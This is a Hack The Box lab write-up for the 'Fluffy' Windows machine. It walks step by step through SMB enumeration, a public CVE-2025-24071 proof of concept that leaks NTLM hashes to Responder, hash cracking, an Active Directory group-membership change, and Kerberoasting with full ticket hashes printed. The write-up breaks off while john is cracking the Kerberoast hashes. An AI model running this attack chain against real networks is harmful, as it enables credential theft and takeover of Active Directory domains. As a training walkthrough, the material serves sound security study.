---
title: Fluffy [Easy]
date: 2025-05-27
tags: [htb, windows, shadow credentials, certificate services, certipy, CVE-2025-24071, clock skew, evil-winrm, nmap, AD, password cracking, responder, smbmap, smbclient, impacket tools]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/fluffy-htb-season8
image: /assets/img/fluffy-htb-season8/fluffy-htb-season8_banner.png
---

# Fluffy HTB Season 8
## Machine information
As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: `j.fleischman` / `J0elTHEM4n1990!`. <br>
Author: [ruycr4ft](https://app.hackthebox.com/users/1253217) and [kavigihan](https://app.hackthebox.com/users/389926)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.55.191                                                                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-26 04:28 EDT
Nmap scan report for 10.129.55.191
Host is up (0.20s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-26 15:08:15Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-26T15:09:40+00:00; +6h38m55s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-05-26T15:09:41+00:00; +6h38m55s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-26T15:09:40+00:00; +6h38m55s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-05-26T15:09:41+00:00; +6h38m55s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h38m54s, deviation: 0s, median: 6h38m54s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-26T15:09:01
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.67 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.55.191 fluffy.htb DC01.fluffy.htb
```

### Enum users
```bash
└─$ sudo crackmapexec smb 10.129.55.191 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --users
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.10.11.69     445    DC01             [+] Enumerated domain user(s)
SMB         10.10.11.69     445    DC01             fluffy.htb\j.fleischman                   badpwdcount: 0 desc: 
SMB         10.10.11.69     445    DC01             fluffy.htb\j.coffey                       badpwdcount: 25 desc: 
SMB         10.10.11.69     445    DC01             fluffy.htb\winrm_svc                      badpwdcount: 0 desc: 
SMB         10.10.11.69     445    DC01             fluffy.htb\p.agila                        badpwdcount: 25 desc: 
SMB         10.10.11.69     445    DC01             fluffy.htb\ldap_svc                       badpwdcount: 0 desc: 
SMB         10.10.11.69     445    DC01             fluffy.htb\ca_svc                         badpwdcount: 0 desc: 
SMB         10.10.11.69     445    DC01             fluffy.htb\krbtgt                         badpwdcount: 26 desc: Key Distribution Center Service Account
SMB         10.10.11.69     445    DC01             fluffy.htb\Guest                          badpwdcount: 68 desc: Built-in account for guest access to the computer/domain
SMB         10.10.11.69     445    DC01             fluffy.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

```bash
└─$ cat users.txt 
Administrator
Guest
krbtgt
DC01$
ca_svc
ldap_svc
p.agila
winrm_svc
j.coffey
j.fleischman
```

### SMB
```bash
└─$ smbmap -H fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!'                                                                                                         

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.55.191:445 Name: fluffy.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ, WRITE
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections
```

```bash
└─$ smbclient -U 'fluffy.htb/j.fleischman%J0elTHEM4n1990!' //10.129.55.191/IT
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon May 19 10:27:02 2025
  ..                                  D        0  Mon May 19 10:27:02 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

                5842943 blocks of size 4096. 1399975 blocks available
smb: \> get Upgrade_Notice.pdf 
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (118.8 KiloBytes/sec) (average 118.8 KiloBytes/sec)
```

Check the PDF file.

![PDF](/assets/img/fluffy-htb-season8/fluffy-htb-season8_pdf.png)

See a list of CVE from the IT Department. Google for these CVEs. <br>
&rarr; Found this [CVE-2025-24071](https://github.com/ThemeHackers/CVE-2025-24071)

### CVE-2025-24071
Look at the `Overview` section.

![CVE-2025-24071](/assets/img/fluffy-htb-season8/fluffy-htb-season8_cve-2025-24071.png)

They told us how to exploit this vulnerability. Let's go for it.

```bash
└─$ git clone https://github.com/ThemeHackers/CVE-2025-24071.git

└─$ python3 CVE-2025-24071/exploit.py -i 10.129.55.191 -f reverse                                                                                                                                                                                        

          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __  
         /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  | ____|      |__ \  | || |    / _ \  |____  | /_ | 
        |  ,----' \   \/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | | 
        |  |       \      /   |   __|  |______/ /  | | | |   / /  |___ \  |______/ /  |__   _| | | | |    / /    | | 
        |  `----.   \    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | | 
         \______|    \__/     |_______|     |____|  \___/  |____| |____/       |____|    |_|    \___/   /_/      |_| 
                                                
                                                
                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)
                    by ThemeHackers                                                                                                                                                           
    
Creating exploit with filename: reverse.library-ms
Target IP: 10.129.55.191

Generating library file...
✓ Library file created successfully

Creating ZIP archive...
✓ ZIP file created successfully

Cleaning up temporary files...
✓ Cleanup completed

Process completed successfully!
Output file: exploit.zip
Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.
```

Now turn on `Responder` to capture the NTLM hash.
```bash
└─$ sudo responder -I tun0           
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.129.55.191]
    Responder IPv6             [dead:beef:2::101e]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-1E2RNILMEJM]
    Responder Domain Name      [T0TF.LOCAL]
    Responder DCE-RPC Port     [49784]

[+] Listening for events...
```

Upload the `exploit.zip` throught `smbclient`.
```bash
─$ smbclient -U 'fluffy.htb/j.fleischman%J0elTHEM4n1990!' //10.129.55.191/IT
Try "help" to get a list of possible commands.
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (4.2 kb/s) (average 4.2 kb/s)
smb: \> ls
  .                                   D        0  Mon May 26 12:40:13 2025
  ..                                  D        0  Mon May 26 12:40:13 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  exploit.zip                         A      322  Mon May 26 12:40:13 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

                5842943 blocks of size 4096. 1469211 blocks available
```

BOOM!, we got the NTLM hash from `p.agila`.

```bash
[SMB] NTLMv2-SSP Client   : 10.129.55.191
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:c31d0cfd5bb68750:1C2C7DB44EBE7C3F93DEADAB46D1B85C:0101000000000000008AF7BD00CEDB0135C31551591B5D1D0000000002000800540030005400460001001E00570049004E002D0031004500320052004E0049004C004D0045004A004D0004003400570049004E002D0031004500320052004E0049004C004D0045004A004D002E0054003000540046002E004C004F00430041004C000300140054003000540046002E004C004F00430041004C000500140054003000540046002E004C004F00430041004C0007000800008AF7BD00CEDB0106000400020000000800300030000000000000000100000000200000126C2F50538AC08E7291D3234CA210F4202BC42E475AE037FF5CFDC90CB4E8240A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330032000000000000000000
```

### Cracking
Just `echo` the hash to a file and crack it with `john`.
```bash
└─$ echo "p.agila::FLUFFY:c31d0cfd5bb68750:1C2C7DB44EBE7C3F93DEADAB46D1B85C:0101000000000000008AF7BD00CEDB0135C31551591B5D1D0000000002000800540030005400460001001E00570049004E002D0031004500320052004E0049004C004D0045004A004D0004003400570049004E002D0031004500320052004E0049004C004D0045004A004D002E0054003000540046002E004C004F00430041004C000300140054003000540046002E004C004F00430041004C000500140054003000540046002E004C004F00430041004C0007000800008AF7BD00CEDB0106000400020000000800300030000000000000000100000000200000126C2F50538AC08E7291D3234CA210F4202BC42E475AE037FF5CFDC90CB4E8240A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330032000000000000000000" > pagila.hash

└─$ john pagila.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)     
1g 0:00:00:07 DONE (2025-05-26 05:43) 0.1278g/s 577735p/s 577735c/s 577735C/s proquis..programmercomputer
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Got the password `prometheusx-303`. Double check with `crackmapexec`.
```bash
└─$ sudo crackmapexec smb fluffy.htb -u 'p.agila' -p 'prometheusx-303'                
SMB         fluffy.htb      445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         fluffy.htb      445    DC01             [+] fluffy.htb\p.agila:prometheusx-303
```
## Initial Access
Let's `winrm` as there is a open port `5985`.
```text
└─$ evil-winrm -i 10.129.128.100 -u 'p.agila' -p 'prometheusx-303'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```

Can not connect with `winrm`. Let's check for bloodhound from user `j.fleischman`.

### Bloodhound
```bash
└─$ bloodhound-python -u 'j.fleischman' -p 'J0elTHEM4n1990!' -d fluffy.htb -c All -o bloodhound_results.json -ns 10.129.55.191
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 07S
```

Upload the `bloodhound_results.json` to `bloodhound`.

![Bloodhound](/assets/img/fluffy-htb-season8/fluffy-htb-season8_bloodhound.png)

So `p.agila` is a member of `SERVICE ACCOUNT MANAGERS@FLUFFY.HTB` and has a **GenericAll** to `SERVICE ACCOUNTS@FLUFFY.HTB`.

&rarr; We can add `p.agila` to `SERVICE ACCOUNTS@FLUFFY.HTB` group to exploit further more credentials.

```bash
└─$ bloodyAD --host 10.129.55.191 -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila 
[+] p.agila added to Service Accounts
```

> Ok but what to enumerate next?

Check again the `bloodhound` graph.

![Bloodhound](/assets/img/fluffy-htb-season8/fluffy-htb-season8_bloodhound2.png)

Found out `ca_svc` has this interesting part `CN=CERTIFICATE AUTHORITY SERVICE,CN=USERS,DC=FLUFFY,DC=HTB`. I google for it and found a blog post exploit by [0xdf](https://www.twitter.com/0xdf_).

![0xdf](/assets/img/fluffy-htb-season8/fluffy-htb-season8_0xdf.png)

I got through the writeup machine `Authority` and saw this part.

![Authority](/assets/img/fluffy-htb-season8/fluffy-htb-season8_authority.png)

So we need to enumerate ADCS also, there is also 2 machines `Escape` and `Absolute`, I go through the `Escape` machine and found out that port `3269` for `ssl/ldap` and `Oxdf` has discussed deep into [TLS Certificate](https://0xdf.gitlab.io/2023/06/17/htb-escape.html#tls-certificate) and also this part [Shell as administrator](https://0xdf.gitlab.io/2023/06/17/htb-escape.html#shell-as-administrator) and we will use this concept for our machine.

### Kerberos
Also I saw from the `Nmap` result.
```bash
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-26 15:08:15Z)
```

Check [The Hacker Recipes](https://www.thehacker.recipes/) and found out more way to exploit with [ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast) which is pretty cool, let's go for this one.

```bash
└─$ GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip 10.129.55.191 'fluffy.htb/p.agila:prometheusx-303'         
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:07:50.136701  2025-05-21 18:21:15.969274             
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:17:00.599545  <never>                                
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-17 20:51:16.786913  2025-05-19 11:13:22.188468             



[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Hmm, `Clock skew too great` and we can see that we can definitely get the `krbtgt` hash for `ca_svc`, `ldap_svc`, `winrm_svc`.
&rarr; Let's research for solve this `Clock skew too great` issue.

![Clock skew](/assets/img/fluffy-htb-season8/fluffy-htb-season8_clock-skew.png)

Okay so these problem pratical happens when different timezones between the attacker and the target. Check this [forum](https://forum.hackthebox.com/t/how-do-you-synchronize-ad-and-time/318340) and [HackTricks](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html).

![Clock skew](/assets/img/fluffy-htb-season8/fluffy-htb-season8_clock-skew2.png)

![Clock skew](/assets/img/fluffy-htb-season8/fluffy-htb-season8_clock-skew3.png)

&rarr; We need to `sudo rdate -n <target-ip>` to sync the time.

```bash
└─$ sudo rdate -n 10.129.55.191
Mon May 26 17:02:32 EDT 2025
```

Now let's try to get the `krbtgt` hash.
```bash
└─$ GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip 10.129.55.191 'fluffy.htb/p.agila:prometheusx-303'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:07:50.136701  2025-05-21 18:21:15.969274             
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:17:00.599545  <never>                                
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-17 20:51:16.786913  2025-05-19 11:13:22.188468             



[-] CCache file is not found. Skipping...
```

```bash
└─$ cat kerberoastables.txt 
$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$8c4fcdc5f7454b39a1efd4d0609da23d$52f91316472913ce160b2512973e29100c7a73c0f5b7a48a86684f81f5b6dde18b35113270d2cd83b959e145ed6ed9e8bd63ed49aa0a3a1cd4528b38b55f0ca2c73a5d6106f7d42c3727337bb48f03f583da98e274a70f2b4dbb26a625502869d87a26b889faf804bfbb1ee064b06ccce385520864927f4b557072ebcc45feafe89b559f1e269467c71215a3678791ce78642226af004c0883f894047e0300668f7a645700d76ab400f4add6ed99256e3b7793306e76181e88855d86d63806219780de6ce6d7b8e798a469533a30f9444ed81662c33741f26aab2c6ffc1da87e0c60c96f50440ee9936804164f2530d207fe9b6cc1344dd707ce5243afbe20b6a009173cd23f5a662bf1b8c632d188792b90d370d2518d39d3fa03f8a2416e2885ca69ed9d9eab57f926ac1f1804ea55dff1eb7b64058842f960135ac227e6380ab046887cdd45e37cd13b690d2a9d7494409074dc591f945a38f56cd8ebed96afc0f9b42e6ae97eba1538167df985fa7bd5f1cebe30456eb05b29e792196e3b4ba6bea811c5a81fec8b90639c6312d43a41c91f99f4352e6b5c652f0a3cb80a3242e50cfa11d416d8b88c026c9d390b713611425c79e29de8d2a80abddf76d2578392b556beb1a07945c7f0018a48301a0d1d7b019df7b2d539c98cf74d8ed9e0c38aced4503546586b6e9c33cc268dffcaca024338ea2ef559184328db1a4d3a8e9d5c585d0fc79247c720977ecfd4367bbdc50d27e00c79085e6d0aef21c5be9814d7de3f9a633d81b4d5a8debe1f3849e96b5e650659dbc239b93289fa7ac98a834e78983f6ef0893342408c1a10343e685037e0ef9b3ccd8d99aae85035adc7e5bd11843503e85f1a560423af3aa36b21c2303de5623de7000094e906b04322366b490b12f69a73ec9da901e0f8aad37a71a8e960315e179d27566ef6b91c864c62a5cd57b5c69ffab14718df7b9a948fb3d3e38343c8b672697ffbf8709559d715c2bc4706a031394783784b2d1972b7070a41dd9d4a24f00bfe1f250202746d969003276fa568341bffb25bdf3c672c14cecf5292c392310d34e4bbe6fd783446bd942c6c67511c20dd0ed53e759f6bd38569734cf8e63cb3bb48cd4faeb72932e086a2b3dea2d181a3df40c35228b05da769db59f168a5dd391d979c377cf854ab962f2783e330ee05b0b88260c61b13f45958ddaaf8b09c4cd8dba190bf355de7b93c22f3a004f94edf17e755e9b4002099a7e006c3f7f01707bb407bf26537270fbe775f0bbb497486281e6564cf454bd86d2173267039fc64f1e03134e1606aa7c8fb2727d9360665f8a0c0b7d800f0229a2b68bf83c85c44f63d953bca85b63c12a9aea499f6ff6b4e45f7e98b5646c5463b87542db5dcd98e2d6ccab9361d7054e9e2c9fb01fad365fa07c71e059e2eda66ec50bee50392188fdb241ae4dc4ed503e3f01b924f64dcfa1cd2d3361757eca954ad70db9545dc3521cb
$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$ba7e6edd4090a73471001b7746dd4fe1$440c56c82a6aad140850e6b391ef7cbba8b1461ad0c9563485ad809bb8dfcbb4da803b0b4b90c3f9763d07b2d9255e26311550f201483aa1a10e452b298f7b38cff1108260009a0827d49bcf55fa6dc7706adc07cad20f6f4aab487408b649a1b81d3be77feec2cf7f4b78157921f83021a9784d0b4d73fd9092790f3b1e924dd32dba1390d6a99e7e5a18cc81b044b5ef901deaad1d24be8aeb9ad7dfa680d5652e2991daf485080cf499a16b135eda6b5ee964b77888533c5ffd0848cfa4773b3e43ef4ab015d6e087f7fcc83cf016cad0988193045701e1771e8dfa2ebd6b5a884d3a5920950c026e7afba7ecf31e42d00ce8fef604683a6bb7177867d1e5ee5301258fc51e335c02d1c9dc638fe5be623c9db1f625411a0ccf4572949a067d134d04588ba305d5f0ab73bdbbadfb4fa78e6a9daea7b342453008878ce7bc90e2758d42ac26e832cda0f59733e3979370dde97bfe71623c17340b1e425fefc0b3110fcee9e607325a51c8594a875f68235e8cbe50cbe6cf41d0004ea1ae76ef4bb7aec43109bef098764b1fe82f10ffae7197d78014d1d147a844fd2fe7ae6e15c9ef8c03f26dc49fdf6146a28b2a4b7fb5e6d24e093a16eeb2cc6b658cf2bcf0f0a2ff44a6d3e40b5da602b5811ceef9d75c9f180f46ecc13a25abd5bd2f5e0119b3b0e2af72c97f6865649c7f0a1318e06d88d2336fe9382ec3a682172ab78d2f62a78dbb40caaa37576a9c1b65b4887c8b318447272d790175082069b9ebe0b1822ada0196379bc8c9aa55b0f5705ca4c9ffc62e68a2c4b71679759ae0e6e2a320e11d749b8c7e15bcbacadfaaf69b87483e477e5997f5feb9daa315a89adff22018fb842f32b15d6a32cc0bca9328c544ca53e13bc010fdf01d51699e2306cbaf751ab7fd292ab695b306645ebc0bd47612ff64a398cebe0cd4b22d5a179c8b080cc568a06fc77ec4799eefd7702eb63d196d7d50c3fb60c4042edd27f6eb497ec0043692c4523b5eb91c8cf9a5a0847fbf1a0bf569b2f378d18d59b326bfe7bd37c1ede8269f5148865d68877547294bfc8c49bf77662a9ee9e2fd2e8d3ee765229ee0e4dafe497b8e8d03b8c77ae6bc953f69f17d937174d6a9c7f5da387d1f5bae45d0534df5ef422c22b3d054a67e1e845cdd19778e7a3a727b4efe628d7bf0d1e86a733f2a337f05ad3d11e9003320cbf03e2408fd29e2b0b99235aa72eced2274dbcaa4d94c8306a0213acdf5f975f4bc629c865b13e25e70c9c45c76a4b457c12251e47db6a2419fc1ea6659c433297913e52d52062230f94ece966b51b00a7e361dcdc403dbcb67ccf952e80c4f747126e51053aeb9d8b785c3fec32f12c6bffa151bcce6cf07f8896e4c8c53a3e026f3e67c408a26ce00c1b21c639ddb681ff2a18e5cd00c335dc2abf0a70ab4ce48cc19a0de2475708ef721581be6d222505d960250f92b06276ee5d2e92998f09faab95ee06b5f2a50d0b919
$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$ba0dfa0d95771f5999106aea373e2521$22d070846d6227e7392f210948a79d12b2ad093f445dbccacc9a0fbd1f07e7580d0e08fe3c63389913b78cff0f9361c85e5c5f602c802862c40f348935108742aac0e6f012687f69c41e402f01bf0961de170db3920565cec515408a3daad2ead8d77181fe0b40c86998b31ae3a439940c8b611cd962a63c239dc482a78b2c30b567735bf3ee9a5f19e35aee8692a5f50ee76a405639f8833425529af42b9a9ab94c8ef69c52383898a5f9c4f2b3f822571a97b6b6d3a942b0695e8a8761c61a3a242880bf4cf2516edfc45add56ede03e43cd82f3decb3c86ab2a292febe764aaf1d2aa1696fee5205d65e7b79a831d5ec775c12e51eff9fde82c8f28b76d348d8d58c9217d94dead664a5d540851377271a7ddd3c66ae5f1d3fd71a039c5a698edfc880c5f697f1d288c784f37c204be9258a59cc7711618d88621b0a9e88cec6a357da2804b65ad7ce7b5cbee0c99dff0e0c23543f7c93822199be0208a90e837b61f84ebdf8ed70ea1ae983e4a1c0c785918213e8f97430d81459c0129906e87cb8a6df147accc64eb185192e4357020c26506fae45f3e69c8d1fdae1d2f9ea007254b943f4a7b33d50b3f0bafae7dddc659d3196f668c2227609f22369d1c0d474c19f6a4fa261834a638fd79ba13f5ea1371d36ec0e1f54fdb1618ad7ee186147cbca4c2e4056d7fa880fe559f968324e666376daa075a1aa27f92128ada25d84f803516502c81c60cff585136480d10a495ffba47a73b3c29f069e50072ecfb40a4de4e45450e44819f1b294d39a5e7cf4469a661001eb48099360bdc02e324e0d91ba20e52b57a5d08a3758a3d9724267ac62425a791c5cc574a160eb566696f0c51a1270ff1c04b75cc7d74c063c733243e82b730af54f01f8dc56fc00c1bed2fe3f7be9a1a6da705599f6b6bf13f1eb41164249dfb790543a3aca38b9448f25891e0835cacc0f87f8e1c34badab6e1f15cdfbcba07608bac0701a19d3044580d1503d929a85bc35702bee76e611f15145adbc6b154445363635fc1e4a589b5e79b3e7336141efa72ed81fa0a57ba7c8312ebd7f6345ca3e456bff85b694a109b1760bb0b5d4d776aeb99f274a00b80074448bca497c4e7af8ad8b65a3fc55d4e5afdcc319a8f4dc1afd679942be84b655bca070c8d3c4f949d6d57509c7f3e2ce691cea5555cc7981c2f01142569b69e759a7382c3eda25a655fcd71e9abfcc114327ab0e4c27610261b89a9ceb37d71acb69dc45d26733152e66bc111cd197be822ce1ada7c90e96081d90ba4cf5a2fec83faf7df78e83c6abb8d90b798ec79921a18d024809ea9d2943a27c0fd9aaa4a0bb26fa4a6afa5d63568fe29921abab956c8a179757e25c563a3a6d870ba6808c965d7ee8d2826e06dd2bbf56d588e74185516f5d37d73d1e50686ff11e4236896e9bb1a43b603624123beb4b3ad52cd918c625e7ce058ecbf8456a271c392035e1cf013bb729e1fd9456c98
```

Got `krb5tgs` for 3 more accounts. Let's cracking it.

```bash
└─$ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoastables.txt 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
